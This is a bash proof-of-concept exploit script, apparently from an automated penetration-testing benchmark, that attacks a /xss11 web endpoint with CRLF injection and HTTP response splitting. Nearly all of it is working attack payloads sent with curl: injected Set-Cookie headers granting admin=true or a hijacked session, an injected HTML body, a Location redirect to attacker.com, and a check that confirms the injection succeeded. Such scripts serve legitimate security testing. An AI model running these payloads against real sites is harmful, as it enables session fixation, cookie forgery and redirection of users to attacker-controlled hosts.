#!/bin/bash
# POC: CRLF Injection and HTTP Response Splitting attack against /xss11 endpoint demonstrating header injection vulnerability
# Target: ./repo
# Created: 2025-11-05T17:20:33.163Z
# Session: benchmark-XBEN-012-24-mhm7ivyh

# CRLF Injection POC for /xss11 endpoint
# Demonstrates HTTP Response Splitting / Header Injection vulnerability

TARGET_URL="${1:-http://localhost:5000}"
ENDPOINT="/xss11"

echo "[*] CRLF Injection POC - HTTP Response Splitting Attack"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Basic CRLF injection with Set-Cookie header injection
echo "[TEST 1] Cookie injection via CRLF"
echo "[*] Payload: \\r\\n Set-Cookie: admin=true"
PAYLOAD1=$'name=test\r\nSet-Cookie: admin=true'
RESPONSE1=$(curl -s -i "$TARGET_URL$ENDPOINT?name=test%0d%0aSet-Cookie:%20admin=true" 2>&1)
echo "[*] Response:"
echo "$RESPONSE1" | head -20
echo ""

# Test 2: Response splitting with double CRLF (inject response body)
echo "[TEST 2] Response splitting - injecting response body"
echo "[*] Payload: \\r\\n\\r\\n <html>Injected</html>"
RESPONSE2=$(curl -s -i "$TARGET_URL$ENDPOINT?name=test%0d%0a%0d%0a%3Chtml%3EInjected%3C/html%3E" 2>&1)
echo "[*] Response:"
echo "$RESPONSE2" | head -20
echo ""

# Test 3: Location header injection (open redirect)
echo "[TEST 3] Location header injection - open redirect"
echo "[*] Payload: \\r\\nLocation: http://attacker.com"
RESPONSE3=$(curl -s -i "$TARGET_URL$ENDPOINT?name=test%0d%0aLocation:%20http://attacker.com" 2>&1)
echo "[*] Response:"
echo "$RESPONSE3" | head -20
echo ""

# Test 4: Custom header injection
echo "[TEST 4] Custom header injection"
echo "[*] Payload: \\r\\nX-Injected-Header: pwned"
RESPONSE4=$(curl -s -i "$TARGET_URL$ENDPOINT?name=test%0d%0aX-Injected-Header:%20pwned" 2>&1)
echo "[*] Response:"
echo "$RESPONSE4" | head -20
echo ""

# Test 5: Line feed only (\\n) injection
echo "[TEST 5] Line feed only injection"
echo "[*] Payload: \\nSet-Cookie: session=hijacked"
RESPONSE5=$(curl -s -i "$TARGET_URL$ENDPOINT?name=test%0aSet-Cookie:%20session=hijacked" 2>&1)
echo "[*] Response:"
echo "$RESPONSE5" | head -20
echo ""

# Test 6: Encoded CRLF (%0d%0a) - Set-Cookie
echo "[TEST 6] Encoded CRLF - Set-Cookie injection"
echo "[*] Payload: %0d%0aSet-Cookie: hijacked=yes"
RESPONSE6=$(curl -s -i "$TARGET_URL$ENDPOINT?name=test%0d%0aSet-Cookie:%20hijacked=yes" 2>&1)
echo "[*] Checking for injected Set-Cookie in response headers..."
if echo "$RESPONSE6" | grep -i "Set-Cookie.*hijacked" > /dev/null; then
    echo "[+] SUCCESS: Injected Set-Cookie found in response headers!"
else
    echo "[-] Set-Cookie not found in expected location"
fi
echo "$RESPONSE6" | head -20
echo ""

echo "[*] POC Complete"
echo "[*] If any of the above responses show injected headers or multiple response blocks,"
echo "[*] the CRLF injection vulnerability is confirmed."